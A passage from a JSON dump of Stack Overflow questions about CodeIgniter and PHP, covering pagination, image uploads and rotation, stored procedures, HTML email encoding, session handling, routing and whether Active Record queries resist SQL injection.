&lt;tr&gt;&lt;td&gt;&lt;b&gt;&lt;input type=\"button\" class=\"btn\" id=\"send\" name=\"Add me\" value=\"Submit\"/&gt;&lt;/td&gt;&lt;/tr&gt;\n              &lt;/table&gt;\n        &lt;/form&gt;\n</code></pre>\n"},{"tags":["php","codeigniter","video","curl","file-get-contents"],"answer_count":5,"favorite_count":0,"up_vote_count":1,"down_vote_count":1,"view_count":213,"score":0,"question_id":12341783,"title":"Not getting a embedded code for video","body":"<p>In my project user will upload a video by pasting a URL from another site. I tried embedly but doesn't work properly since it gives embedded code for a particular site, YouTube etc. I want to do exactly like this site <a href=\"http://www.myvidster.com/\" rel=\"nofollow\">http://www.myvidster.com/</a>. I tried using <code>cURL</code> code for this:-</p>\n\n<pre><code>$ch = curl_init();\ncurl_setopt($ch, CURLOPT_URL, $video_url);\ncurl_setopt($ch, CURLOPT_SSL_VERIFYPEER, FALSE); \ncurl_setopt($ch, CURLOPT_VERBOSE, true); // Display communication with server\ncurl_setopt($ch, CURLOPT_RETURNTRANSFER, true);\n$json_reply = curl_exec($ch);\ncurl_close($ch);\n</code></pre>\n\n<p>and code with <code>file_get_contents</code> is:</p>\n\n<pre><code>$video_url = $_POST['video_url'];\n$html = file_get_contents($video_url,true);\n</code></pre>\n\n<p>But using curl also I got HTML part of some sites only. I am trying for 1 week but still no result. Is it possible to get an embedded code for video from every site? Or I am doing anything wrong?</p>\n"},{"tags":["mysql","codeigniter","table","fields","same"],"answer_count":1,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":61,"score":1,"question_id":12492219,"title":"Compare 2 values in same row and same table using Codeigniter","body":"<p>Can anybody help me out, while my solution does not seem to work:</p>\n\n<pre><code>$this-&gt;db-&gt;where('stock &lt;=','stock_min');\n$res = $this-&gt;db-&gt;get(\"products\")-&gt;result();\n</code></pre>\n\n<p>You see I want to compare the field 'stock' to be less than or equal to 'stock_min'...</p>\n\n<p>Someone?</p>\n\n<p>As requested the table-structure:</p>\n\n<pre><code>    CREATE TABLE IF NOT EXISTS `products` (\n  `id` int(11) NOT NULL AUTO_INCREMENT,\n  `sub_of` int(11) DEFAULT NULL,\n  `category` int(45) NOT NULL DEFAULT '0',\n  `name` varchar(45) NOT NULL DEFAULT '',\n  `slug` varchar(250) NOT NULL,\n  `number` varchar(45) DEFAULT NULL,\n  `description` text NOT NULL,\n  `value` decimal(5,0) NOT NULL DEFAULT '0',\n  `value_discount` varchar(100) DEFAULT NULL,\n  `yell` varchar(100) DEFAULT NULL,\n  `display_price` tinyint(1) DEFAULT '0',\n  `stock` int(11) NOT NULL DEFAULT '0',\n  `stock_min` int(11) NOT NULL DEFAULT '1',\n  `warned` tinyint(2) NOT NULL DEFAULT '0',\n  `relation` varchar(350) DEFAULT NULL,\n  `supplier` varchar(150) DEFAULT NULL,\n  `price_in` decimal(10,2) DEFAULT '0.00',\n  `price_out` decimal(10,2) DEFAULT '0.00',\n  `price_out_btw` decimal(10,2) DEFAULT '0.00',\n  `active` smallint(6) DEFAULT '0',\n  `display_from` date NOT NULL DEFAULT '0000-00-00',\n  `display_till` date NOT NULL DEFAULT '0000-00-00',\n  `seen` int(11) NOT NULL DEFAULT '0',\n  `info_requested` int(11) NOT NULL DEFAULT '0',\n  `inserted` timestamp NOT NULL DEFAULT CURRENT_TIMESTAMP ON UPDATE CURRENT_TIMESTAMP,\n  PRIMARY KEY (`id`)\n) ENGINE=MyISAM  DEFAULT CHARSET=latin1 AUTO_INCREMENT=322 ;\n</code></pre>\n"},{"tags":["php","codeigniter","pagination"],"answer_count":2,"favorite_count":1,"up_vote_count":4,"down_vote_count":0,"view_count":5616,"score":4,"question_id":2330550,"title":"CodeIgniter Pagination Problem","body":"<p>I am using codeigniter and its pagination class. It works perfectly and it looks something like this:</p>\n\n<blockquote>\n  <p>« First  &lt; <strong>1</strong> 2 3 4 5 >  Last »</p>\n</blockquote>\n\n<p>Here is my code:</p>\n\n<pre><code>$this-&gt;load-&gt;library('pagination');\n$config['base_url'] = base_url().'controlpanel/';\n$config['first_link'] = 'First';\n$config['total_rows'] = $count;\n$config['per_page'] = '3'; \n$this-&gt;pagination-&gt;initialize($config); \n$data['pagination'] = $this-&gt;pagination-&gt;create_links();\n$this-&gt;load-&gt;view('controlpanel', $data);\n</code></pre>\n\n<p>I have this in my routes:</p>\n\n<pre><code>$route['controlpanel/(:num)'] = \"controlpanel/index/$1\";\n</code></pre>\n\n<p>However, whenever I get to a differentpage i.e. <code>controlpanel/3</code> - the number 1 is always bold - it should change to 2 or 3 etc! </p>\n\n<p>Why doesn't it?</p>\n\n<p>When I change the <code>$config['base_url']</code> to <code>base_url().'controlpanel/page'</code> then does the pagination work correctly by boldening the correct number - but the link 1 points to the URL <code>controlpanel/page</code> which is the wrong page for me as the base is just <code>controlpanel</code>.</p>\n\n<p>Thanks all for any help.</p>\n"},{"tags":["codeigniter","pagination"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":46,"score":0,"question_id":12491864,"title":"pagination doesn't work in codeigniter","body":"<p>I have successfully created pagination on some of the pages on the application on which I am working with, but I can't make it on this one:</p>\n\n<p>I have 7 records in the database, and when \npage is displayed all 7 records are displayed instead of 5, as I would like to be.</p>\n\n<p>Sure enough, links for the paging are not displayed.</p>\n\n<p>Here is my controller code:</p>\n\n<pre><code>public function displayAllFaqCategories()\n    {\n\n         //initializing &amp; configuring paging\n\n        $currentUser = $this-&gt;isLoggedIn();\n        $this-&gt;load-&gt;model('faqCategoriesModel');\n        $this-&gt;db-&gt;order_by('sorder');\n        $limit = 5;\n        $offset = 3;\n\n        $offset = $this-&gt;uri-&gt;segment(3);\n        $this-&gt;db-&gt;limit(5, $offset);\n\n        $data['faq_categories'] = $this-&gt;faqCategoriesModel-&gt;selectCategoriesAndParents();\n        $totalresults = $this-&gt;db-&gt;get('faq_categories')-&gt;num_rows();\n\n        //initializing &amp; configuring paging\n        $this-&gt;load-&gt;library('pagination');\n        $config['base_url'] = site_url('/backOfficeUsers/faqcategories');\n        $config['total_rows'] = $totalresults;\n        $config['per_page'] = 5;\n        $config['uri_segment'] = 3;\n\n\n        $this-&gt;pagination-&gt;initialize($config); \n\n        $errorMessage = '';\n        $data['main_content'] = 'faq/faqcategories';\n        $data['title'] = 'FAQ Categories';\n\n        $this-&gt;load-&gt;vars($data,$errorMessage);\n        $this-&gt;load-&gt;vars($currentUser);\n        $this-&gt;load-&gt;view('backOffice/template');\n\n    } // end of function displayAllFaqCategories\n</code></pre>\n\n<p>And here is my model function code:</p>\n\n<pre><code>public function selectCategoriesAndParents($selectWhat = array())\n   {    \n       $data = array();\n       $query = $this-&gt;db-&gt;query(\"SELECT fq . * , COALESCE( fqp.$this-&gt;parent_name,  '0' ) AS parentname\n                                  FROM $this-&gt;table_name AS fq\n                                  LEFT OUTER JOIN $this-&gt;table_name AS fqp ON fqp.catid = fq.parentid\"); \n       if($query-&gt;num_rows() &gt; 0) \n       {\n           foreach($query-&gt;result_array() as $row) \n               {\n                   $data[] = $row;  \n               }\n           }           \n       $query-&gt;free_result();\n       return $data;\n   } // end of function selectCategoriesAndParents    \n</code></pre>\n\n<p>In the view, bellow of the table with the records I have the following code:</p>\n\n<pre><code> &lt;?php echo $this-&gt;pagination-&gt;create_links();?&gt;\n</code></pre>\n\n<p>Any help will be deeply appreciated.</p>\n\n<p>Regards,Zoran</p>\n"},{"tags":["php","codeigniter","frameworks","upload"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":1,"view_count":70,"score":-1,"question_id":12475550,"title":"getting error when uploading image (php/codeigniter)","body":"<p>My problem is about making a directory in linux. My website has a back-end in which i can upload images for the site and it automatically creates folders according to YEAR and Month in which images were uploaded.</p>\n\n<p>But from changing the web host platform windows to linux i got errors, i am able to upload images successfully but unable to see it when it uploads.</p>\n\n<p>If i upload a image with name <code>pdf.png</code> from my backend (admin panel) then it shows nothing and i see the image was uploaded in the form of <code>2012\\09\\pdf.png</code> in my upload folder of website. but i want this uploaded file in my <code>/2012/09/</code> folder. the folder was created automatically according to year and month.</p>\n\n<p>Please find the <a href=\"http://www.mediafire.com/?bpnh18a7pbzn83h\" rel=\"nofollow\">Screen Shot of error and source code (ZIP)</a> for my php program, if you find something wrong please help me to solve it, thanks!</p>\n\n<pre><code>    function upload()\n    {\n    $a = $this-&gt;_make_dir();       \n    if(move_uploaded_file($a[\"tmpname\"], $a[\"target\"]))\n    {\n        echo 'success';\n        $this-&gt;art_media-&gt;create(array(\"media_filename\"=&gt;$a[\"file\"],\n            \"media_date\"=&gt;time(),\n            \"media_title\"=&gt;$a[\"file\"],\n            \"media_description\"=&gt;\"\",\n            \"media_filelink\"=&gt;date(\"Y\").\"/\".date(\"m\").\"/\",\n            \"media_isimage\"=&gt;false,\n            \"media_type\"=&gt;$a[\"filetype\"]\n            ));\n\n    } \n    else\n    {\n        echo 'failed';\n    }\n}\nfunction _make_dir()\n{\n    $target1 = FCPATH.$this-&gt;config-&gt;item(\"articles_media\").date(\"Y\");\n    $target = $target1.\"\\\\\".date(\"m\");\n\n    $uploadfile = $_FILES[\"Filedata\"][\"name\"];\n    $type = $_FILES[\"Filedata\"][\"type\"];\n    if(!is_dir($target1))\n    {\n        mkdir($target1);\n        mkdir($target);\n    }\n    else\n    {\n        if(!is_dir($target))\n        {\n            mkdir($target);\n        }\n    }        \n    if(is_file($target.\"\\\\\".$uploadfile)==true)\n    {\n        echo 'duplicate';\n        exit();\n         //$uploadfile = $uploadfile.\"_\".$n;\n    }\n    return array(\"filetype\"=&gt;$type,\"file\"=&gt;$uploadfile,\"targetpath\"=&gt;$target.\"\\\\\",\"target\"=&gt;$target.\"\\\\\".$uploadfile,\"tmpname\"=&gt;$_FILES['Filedata']['tmp_name']);\n}\n</code></pre>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":67,"score":0,"question_id":12486720,"title":"Codeigniter DB errors after stored procedure call","body":"<p>I have a database that has a few stored procedures in it that I would like to call via CodeIgniter.  I have the following code in my Model class:</p>\n\n<pre><code>$sql = \"CALL `stored_proc`(1)\";\n$query = $this-&gt;db-&gt;query($sql); //This call breaks the DB :(\n\n$this-&gt;db-&gt;select('status');\n$this-&gt;db-&gt;where('id', $id);\n$query = $this-&gt;db-&gt;get('table');\n\nprint($query-&gt;num_rows()); //line 1116\n</code></pre>\n\n<p>When I run this code, I get the following error:</p>\n\n<blockquote>\n  <p>Fatal error: Call to a member function num_rows() on a non-object in C:\\server\\apache\\htdocs\\application\\models\\let_model.php on line 1116</p>\n</blockquote>\n\n<p>If I remove the query line, the select works properly.  Also, if I replace the call to a stored procedure with say a SELECT command, it also works properly.</p>\n\n<p>Is there something obvious I'm missing for why I'm getting this error?  If there isn't a good answer, is there a way to work around this problem?</p>\n\n<p>Thanks for your time!</p>\n\n<p><strong>Edit:</strong> After delving a little deeper into the problem, it seems that this error will occur if my stored procedure contains a SELECT command.  UPDATES seem to work properly.  Perhaps this problem has something to do with how CodeIgniter deals with SELECT results?</p>\n"},{"tags":["jquery","jquery-ui","codeigniter","jquery-ui-draggable","jquery-ui-droppable"],"answer_count":2,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":189,"score":2,"question_id":12487511,"title":"Jquery Shirt Designer - HOW?","body":"<p>I have a client that is requesting that I make something similar to a shirt designer you'd see on a mainstream t-shirt site. </p>\n\n<p>What it will require is for a user to be able to enter text in a text input and then drag the text around an image. I have 2 main concerns that if I can figure them out, I'll be able to do this project...</p>\n\n<p>Concern 1: How can I get the text to drag around the image? My idea would be to use Jquery UI draggable to drag the text around the page. I would just use jquery to grab the value of the text input and put it in a div that is draggable. Does this sound like a good plan?</p>\n\n<p>Concern 2: How do I take a snapshot of the main div that has the image of his shirt and the text in the position that he wants it so I can pass the image to the site owner? Is there some kind of script that will take a snapshot of the div? I've looked around for an answer to this and can't find much.</p>\n\n<p>Any help is greatly appreciated</p>\n"},{"tags":["mysql","codeigniter","activerecord","sql-injection"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":89,"score":0,"question_id":12490011,"title":"Are Codeigniter - Active Records Vulnerable to SQL Injections?","body":"<p>Just read <a href=\"http://stackoverflow.com/questions/60174/best-way-to-prevent-sql-injection-in-php\">this</a> on Stack overflow and thus left me wondering if sql injection is possible through active records in CI.</p>\n\n<p>At most of the places in my project , for user registration and user profile update i have done sql insertions like this :</p>\n\n<p>Controller :</p>\n\n<pre><code>$name = $this-&gt;input-&gt;post('name');\n$last_name = $this-&gt;input-&gt;post('last_name');\n$age = $this-&gt;input-&gt;post('dob');\n\n$user_data = array(\n   'name' =&gt; $name,\n   'last_name' =&gt; $last_name,\n   'age' =&gt; $age\n        );\n\n$this-&gt;user_model-&gt;add_user_function($user_data);\n</code></pre>\n\n<p>Model:</p>\n\n<pre><code>function add_user_function($data);\n{\n$this-&gt;db-&gt;insert('user_table',$data);\nreturn;\n}\n</code></pre>\n\n<p>Just like the example in the SO link above , is my code vulerable to sql injection , can u give a particular example if it is possible to harm my system and how can i prevent if it exists.</p>\n"},{"tags":["codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":3,"down_vote_count":1,"view_count":132,"score":2,"question_id":12278339,"title":"Session issue in codeigniter for arabic character","body":"<p>I am just stuck with a issue regarding session. I have a multilingual ecommerce site for english and arabic language. In case of arabic language when someone registers with a arabic name, description or such fields s/he can register successfully. But during login the session data being lost.</p>\n\n<p>Actually when setting all the data into a session array its being stored and i tested it by printing the array. But after the valid authentication when user being redirected to index page or profile page then the session array disappears. The full array being lost. and login doesnt working. Its only happening for someone who has arabic fields on their data. for english its perfectly ok. </p>\n\n<p>I have removed the session.php from syatem/libraries directory. Then it works only on localhost, on server it creates problem when ordering or viewing items of a particular org.</p>\n\n<p>Any suggestion will be accepted cordially.</p>\n\n<p>Thanks</p>\n"},{"tags":["php","datetime","codeigniter","dateformat"],"answer_count":2,"favorite_count":1,"up_vote_count":2,"down_vote_count":0,"view_count":2244,"score":2,"question_id":4630802,"title":"CodeIgniter: format mysql DATETIME field dd/mm/yy hh:mm","body":"<p>Hi pretty much what it says on the tin.</p>\n\n<p>I have a datetime mysql field I want to output in the format dd/mm/yyyy hh:mm like 07/01/2011 22:16.</p>\n\n<p>I've tried:</p>\n\n<pre><code>&lt;?php \n  $datestring = '%d/%m/%Y %h:%i';  \n  echo mdate($datestring,$row-&gt;created); \n?&gt;\n</code></pre>\n\n<p>But I'm getting an error:</p>\n\n<pre><code>Message: A non well formed numeric value encountered\n</code></pre>\n\n<p>Any help most appreciated!</p>\n\n<p>Cheers,</p>\n\n<p>Billy</p>\n"},{"tags":["php","html","codeigniter","email"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":1,"view_count":88,"score":1,"question_id":12482530,"title":"Codeigniter strips characters from HTML Email","body":"<p>I have developed a CMS and when user forgets his/her password / the system will generate a new random password and send it to the user through email but when i open the email it automatically strip some character from my email body replacing them with (=). </p>\n\n<p>This is the email after its sent you can see the messed up parts in bold</p>\n\n<p>Dear Noor Shirzai This Email was <strong>se=t</strong> to you in order to inform you that your Password has <strong>be=n</strong> reset.\nBellow is your New Password :\nYour Username is : mohib\nYour New <strong>Pas=word</strong> is : IOODiGhcYYrL\nPlease change your <strong>&lt;=trong></strong> New Password as soon as you login to the system in order <strong>to=avoid</strong> any security issues.</p>\n\n<p><strong>Note :</strong> when i send this with Pure PHP mail function it works fine.</p>\n\n<p>bellow is my email function and the email configuration file code:</p>\n\n<p>I will really appreciate any help that i get. \nthanks </p>\n\n<p>my function that send the mail:</p>\n\n<pre><code>if (! function_exists('send_password'))\n{\n    function send_password($user_info, $password)\n    {\n        $CI =&amp; get_instance();\n\n        $username           = $user_info['username'];\n        $name               = $user_info['firstname'].' '.$user_info['lastname'];\n        $email              = $user_info['email'];\n\n        $subject            = 'Your New Password : Noor CMS |'.$CI-&gt;config-&gt;item('site_name');\n        //email body\n        $message            = '';\n\n        $message            .= '&lt;!DOCTYPE html PUBLIC \"-//W3C//DTD XHTML 1.0 Strict//EN\" \"http://www.w3.org/TR/xhtml1/DTD/xhtml1-strict.dtd\"&gt;';\n        $message            .= '&lt;html xmlns=\"http://www.w3.org/1999/xhtml\" xml:lang=\"en\" lang=\"en\"&gt;';\n        $message            .= '&lt;meta content=\"text/html; charset=utf-8\" http-equiv=\"Content-type\"&gt;';\n        $message            .= '&lt;head&gt;';\n        $message            .= '&lt;title&gt; Your New Password : Noor CMS | '.$CI-&gt;config-&gt;item('site_name').' &lt;/title&gt;';\n        $message            .= '&lt;/head&gt;';\n        $message            .= '&lt;body&gt;';\n        $message            .= 'Dear '.trim($name);\n        $message            .= 'This Email was sent to you in order to inform you that your &lt;strong&gt;Password&lt;/strong&gt; has been reset.&lt;br/&gt;';\n        $message            .= 'Bellow is your &lt;strong&gt; New Password :&lt;/strong&gt;&lt;br/&gt;';\n        $message            .= 'Your &lt;strong&gt;Username &lt;/strong&gt;is : &lt;strong&gt; '.trim($username).'&lt;/strong&gt;&lt;br/&gt;';\n        $message            .= 'Your &lt;strong&gt;New Password &lt;/strong&gt;is : &lt;strong&gt; '.trim($password).'&lt;/strong&gt;&lt;br/&gt;';\n        $message            .= 'Please change your &lt;strong&gt;New Password&lt;/strong&gt; as soon as you login to the system in order to avoid any security issues.&lt;br/&gt;';\n        $message            .= '&lt;/body&gt;&lt;/html&gt;';\n\n        //prepare email and send\n        $CI-&gt;email-&gt;from($CI-&gt;config-&gt;item('admin_email'), $CI-&gt;config-&gt;item('admin_name'));\n        $CI-&gt;email-&gt;to($email);\n        $CI-&gt;email-&gt;subject($subject);\n        $CI-&gt;email-&gt;message($message);\n\n        if ($CI-&gt;email-&gt;send())\n        {\n            return TRUE;\n        }\n\n        return FALSE;\n    }\n}\n</code></pre>\n\n<p>And the email.php config file is as follows:</p>\n\n<pre><code>$config['useragent']            = 'NoorCMS';\n$config['protocol']         = 'mail';\n$config['mailpath']         = '/usr/sbin/sendmail';\n$config['smtp_host']            = '';\n$config['smtp_user']            = '';\n$config['smtp_pass']            = '';\n$config['smtp_port']            = 25;\n$config['smtp_timeout']         = 10;\n$config['wordwrap']         = FALSE;\n$config['wrapchars']            = 100;\n$config['mailtype']         = 'html';\n$config['send_multipart']       = FALSE;\n$config['charset']          = 'utf-8';\n$config['validate']         = FALSE;\n$config['priority']         = 1;\n$config['crlf']             = '\\n';\n$config['newline']          = '\\n';\n$config['bcc_batch_mode']   = FALSE;\n$config['bcc_batch_size']       = 200;\n</code></pre>\n"},{"tags":["php","mysql","arrays","codeigniter"],"answer_count":2,"favorite_count":1,"up_vote_count":1,"down_vote_count":0,"view_count":45,"score":1,"question_id":12487449,"title":"Why is the data only displaying when it's in a foreach loop but outside it's a non-object?","body":"<p>I'm new to PHP and confused about this bit ..</p>\n\n<p>When I have this it shows the data</p>\n\n<pre><code>&lt;?php foreach ($profile as $p):?&gt;\n    &lt;?php echo $profile-&gt;custom_url;?&gt;\n                    &lt;?php endforeach?&gt;\n</code></pre>\n\n<p>But when I do this I get \" Trying to get property of non-object\"</p>\n\n<pre><code>   &lt;?php echo $profile-&gt;custom_url;?&gt;\n</code></pre>\n\n<p>yet I have seen code where it's not in a foreach loop and the data displays. Can anybody help explain why that is?</p>\n"},{"tags":["php","codeigniter","memory-management","memory-leaks","codeigniter-2"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":49,"score":0,"question_id":12362262,"title":"nullifying codeigniter objects or php in general?","body":"<p>I am using codeigniter and PHP to build a web app and there are lot of objects that I have to define/use inside models due to large number of queries that I have to execute.\nSometime I have to use same object multiple times inside a loop, for example:</p>\n\n<pre><code>  $dbData = $this-&gt;mydb-&gt;query($dbQuery);\n  if($dbData-&gt;num_rows() &gt;0 ){ //check if rows were returned\n     $dbResult = $dbData-&gt;result();\n     foreach( $dbResult as $index =&gt; $row){\n        $dbArray[$row-&gt;JOB_NAME_STG] = $row-&gt;REC_LOADED;\n    }\n</code></pre>\n\n<p>In general programming practice you should nullify the objects once they are no longer required but I haven't been able to find any detail on the best way to ensure that all the objects are nullified avoiding memory leaks for codeigniter or php in general.</p>\n\n<p>Is assigning NULL to an object at the end of the function sufficient?</p>\n\n<pre><code>$dbData = $this-&gt;mydb-&gt;query($dbQuery);\n$dbData = NULL;\n</code></pre>\n\n<p>Or codeigniter has more efficient way of ensuring that there are no memory leaks.</p>\n\n<p>Should object be nullified inside a loop before using to ensure there is no memory leak?</p>\n\n<p>Any pointers in the direction will be appreciated.\nThanks!!!</p>\n"},{"tags":["php","codeigniter","asset-management"],"answer_count":1,"favorite_count":0,"up_vote_count":2,"down_vote_count":0,"view_count":686,"score":2,"question_id":5308317,"title":"What is a comparable asset manager for Code Igniter to Carabiner?","body":"<p>Carabiner seems like a solid asset manager for CodeIgniter but it isn't maintained. Is there a comparable asset management plugin that's well maintained for Code Igniter? As a side question, is there a template management plugin you recommend and why? </p>\n"},{"tags":["php","mysql","codeigniter"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":49,"score":1,"question_id":12451622,"title":"Better to parse an array or add a database call?","body":"<p>I'll be coding up both to test them, but I was curious on first blush what the folks here thought.</p>\n\n<p>I've got an array of data that has been posted to my shopping cart controller.  The array includes an entry for each of the product's potential options.</p>\n\n<p>To get the options into an array for presentation I can either parse the array looking for arrays with keys that begin with \"options-\" or I can make a database call and find out what options are available for that product.</p>\n\n<p>We are talking about at most 5 items at this time.</p>\n\n<p>Thoughts?</p>\n"},{"tags":["codeigniter","authentication"],"answer_count":1,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":60,"score":0,"question_id":12486459,"title":"How to authenticate Codeigniter user, without login form?","body":"<p>How can I authenticate Codeigniter user, without using login form?</p>\n\n<p>Ie, if he have cookie with some specific value or he is redirected from some specific link, to be authenticated automatically?</p>\n"},{"tags":["php","codeigniter","routing"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":29,"score":0,"question_id":12486483,"title":"Loading a controller method on default controller without reference to the controller in the URL","body":"<p>Hi I'm developing a CodeIgniter application that gives user their own website.</p>\n\n<p>What I'm trying to accomplish: If a user has an account they have their own subdomain (ex: user.website.com), and the default controller becomes 'user_website', if the website is accessed normally (no subdomain) the default controller is 'website'.</p>\n\n<p>When the user accesses their section I have a method for example called 'test'</p>\n\n<p>So to access that the user would go to: \nuser.website.com/user_website/test</p>\n\n<p>What I want to happen is:\nuser.website.com/test</p>\n\n<hr>\n\n<p>So basically what I'm asking is how can I get codeigniter to if there is a subdomain in use access methods for the controller directly without having to put the controller in the url.</p>\n\n<p>So instead of user.website.com/auth going to the auth controller, it would use an auth method of the user_website controller</p>\n\n<p>If anyone can help me out on how to accomplish this, or point me in the right direction, thanks in advance.</p>\n\n<p>Also here is _remap function from MY_Controller which all my controllers extend.</p>\n\n<pre><code>public function _remap($method, $arguments)\n    {\n\n        if (method_exists($this, $method))\n        {\n            call_user_func_array(array($this, $method), array_slice($this-&gt;uri-&gt;rsegments, 2));\n        }\n        else\n        {\n            show_404(strtolower(get_class($this)).'/'.$method);\n        }\n\n        $this-&gt;_load_view();\n    }\n</code></pre>\n"},{"tags":["codeigniter","authentication"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":12485749,"title":"Codeigniter login (auth) only with username (without password)","body":"<p>Is there a way to make authentication into Codeigniter, only with username, not using a password?</p>\n\n<p>Thank you in advance!</p>\n"},{"tags":["php","codeigniter","webserver","localhost","web-security"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":71,"score":1,"question_id":12485567,"title":"Is there a way to get the document root on localhost in the same format that we get on remote servers (like /home/MyUserName/public_html)?","body":"<p>CodeIgniter documentations says:</p>\n\n<blockquote>\n  <p>For the best security, both the <strong><em>system</em></strong> and any <strong><em>application</em></strong>\n  folders should be placed above web root so that they are not directly\n  accessible via a browser.  After moving them, open your main index.php\n  file and set the $system_folder and  application_folder variables,\n  preferably with a full path, e.g. '/www/MyUser/system'.</p>\n</blockquote>\n\n<p>and through echoing the PHP <code>$_SERVER['DOCUMENT_ROOT']</code> variable I've gotten the document root of my remote server, which was <code>/home/MyUserName/public_html</code> but when I tried to do the same on my localhost I've gotten a different type of pathes (a windows path), it was <code>D:/xampp/htdocs</code>. Why? and Is there a way through which I can get a path like the first one on my localhost?</p>\n"},{"tags":["codeigniter","error-handling","form-validation"],"answer_count":6,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":1821,"score":1,"question_id":1697693,"title":"CodeIgniter: set_message for max_length[x]","body":"<p>How do you set an error message for <code>max_length</code> and <code>min_length</code> rules. For instance, if I set a rule <code>max_length[6]</code>, I'd like the error message to display\n<code>Max characters allowed: 5</code></p>\n"},{"tags":["php","image","codeigniter","rotation","gd"],"answer_count":2,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":54,"score":1,"question_id":12445334,"title":"Codeigniter rotate large images","body":"<p>i have a problem in codeigniter rotating large images...bigger than 1.2mb.\nfor smaller images, there is no problem.</p>\n\n<p>here is the code:</p>\n\n<pre><code>public function rotate(){\n    $path = $this-&gt;input-&gt;post('path');\n    $file = $this-&gt;input-&gt;post('file');\n    $config['image_library'] = 'gd2';\n    $config['source_image'] = $path;\n    $config['rotation_angle'] = '90';\n    $config['new_image'] = './uploads/_rot'.$file;\n    $this-&gt;load-&gt;library('image_lib');\n\n    $this-&gt;image_lib-&gt;initialize($config); \n    //$this-&gt;image_lib-&gt;rotate();\n    if(!$this-&gt;image_lib-&gt;rotate()){\n        echo $this-&gt;image_lib-&gt;display_errors();\n    } else {\n        echo 'OK';\n    }\n}\n</code></pre>\n"},{"tags":["codeigniter","resize"],"answer_count":2,"favorite_count":0,"up_vote_count":0,"down_vote_count":0,"view_count":285,"score":0,"question_id":2406335,"title":"CodeIgniter resize() problem","body":"<p>Function:</p>\n\n<pre><code>function do_upload() {\n\n    $config = array(\n        'allowed_types' =&gt; 'jpg|jpeg|gif|png',\n        'upload_path' =&gt; $this-&gt;gallery_path,\n        'max_size' =&gt; 2000\n    );\n\n    $this-&gt;load-&gt;library('upload', $config);\n    $this-&gt;upload-&gt;do_upload();\n    $image_data = $this-&gt;upload-&gt;data();\n\n\n    $config = array( \n        'image_library' =&gt; 'gd2', \n        'source_image' =&gt; $image_data['full_path'], \n        'new_image' =&gt; $this-&gt;gallery_path . '/thumbs',\n        'maintain_ratio' =&gt; TRUE,\n        'width' =&gt; 150,\n        'height' =&gt; 267\n    );\n\n    $this-&gt;load-&gt;library('image_lib', $config);\n    if ( ! $this-&gt;image_lib-&gt;resize())\n    {\n        echo $this-&gt;image_lib-&gt;display_errors();\n    }\n    $this-&gt;image_lib-&gt;clear();\n\n}\n</code></pre>\n\n<p>And gives a white page, dont display errors.\n<strong>But if I erase this lines, works fine!</strong></p>\n\n<pre><code>'maintain_ratio' =&gt; TRUE,\n'width' =&gt; 150,\n'height' =&gt; 26   \n</code></pre>\n"},{"tags":["php","codeigniter"],"answer_count":4,"favorite_count":0,"up_vote_count":1,"down_vote_count":0,"view_count":140,"score":1,"question_id":12475203,"title":"Handling Dynamic Content in CodeIgniter (Best Practice)","body":"<p>I'm creating a website with CodeIgniter &amp; have a question on best practice.</p>\n\n<p>I generally break my webpages up into modular chunks.  Header, Content, Footer (and some other stuff sprinkled in between as needed.</p>\n\n<p>The 'Header' and 'Footer' chunks are usually static, while the guts in between can change depending on a few variables (the actual page for example - home, about, contact etc.)</p>\n\n<p>Below is the controller for the page.  header_view, navigation_view, and footer_view will (most likely) never change.  The home_main_view will.</p>\n\n<pre><code>public function index()\n{\n    $this-&gt;load-&gt;view('header_view');\n    $this-&gt;load-&gt;view('navigation_view');\n    $this-&gt;load-&gt;view('home_main_view');\n    $this-&gt;load-&gt;view('footer_view');\n\n}\n</code></pre>\n\n<p>If a user navigates to the about page for example, the views may look something like this:</p>\n\n<pre><code>public function index()\n{\n    $this-&gt;load-&gt;view('header_view');\n    $this-&gt;load-&gt;view('navigation_view');\n    $this-&gt;load-&gt;view('about_view');\n    $this-&gt;load-&gt;view('footer_view');\n\n}\n</code></pre>\n\n<p>How would I handle that change in CI?  Is it best to make home_main_view a variable and pass is into the index() function?  I've done this before (user clicks a link that triggers a function in the controller that sets $var that calls index($var) that calls view($var).</p>\n"},{"tags":["php","codeigniter","codeigniter-2"],"answer_count":0,"favorite_count":1,"up_vote_count":0,"down_vote_count":0,"view_count":68,"score":0,"question_id":11927883,"title":"how to get checked box based on value, and save to database","body":"<p>I have two database tables to manage user access:</p>\n\n<ol>\n<li><p>Table <code>Level</code></p>\n\n<pre class=\"lang-none prettyprint-override\"><code>lvl_Id| level_name\n1     |  admin\n2     |  user_1\n3     |  user_2\n</code></pre></li>\n<li><p>Table <code>Menu</code></p>\n\n<pre class=\"lang-none prettyprint-override\"><code>Menu_name | menu_allowed\nEdit_data | +1+2+\nPrint_data| +1+2+3+\nEdit_user | +1+\nEdit_index| +1+2+\nview_index| +1+2+3+\n</code></pre></li>\n</ol>\n\n<p>What I want to do is change <code>menu_allowed</code> in Table <code>menu</code>, with checkbox in view page and update the table.</p>\n\n<p>This is my code in view page:</p>\n\n<pre class=\"lang-php prettyprint-override\"><code>&lt;tr&gt;\n&lt;td&gt;Hak akses&lt;/td&gt;\n&lt;td&gt; : &lt;/td&gt;\n&lt;td id=\"check\"&gt;&lt;?php foreach($test as $data) : ?&gt;\n&lt;input type=\"checkbox\" name=\"menu[]\" value=\"&lt;?php echo $data-&gt;menu_allowed 